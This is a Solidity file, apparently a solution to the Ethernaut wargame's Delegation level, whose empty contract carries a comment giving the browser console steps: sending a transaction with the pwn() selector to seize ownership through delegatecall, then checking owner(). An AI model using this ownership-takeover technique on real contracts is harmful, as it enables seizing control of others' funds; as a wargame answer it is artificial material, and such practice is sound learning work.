// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/IDelegation.sol";

/**
 * @title Delegation Attack (Ethernaut Challenge Level 6 - Delegation)
 * @notice There is no way to pass this level via contract call.
 * @dev You can run orderly these scripts in browser:
 * > await contract.sendTransaction({ data: web3.utils.sha3('pwn()') })
 * to make sure check result:
 * > await contract.owner()
 * submit
 * @author Emre Tepe (@emretepedev)
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493
 */
// solhint-disable-next-line no-empty-blocks
contract DelegationAttack {

}
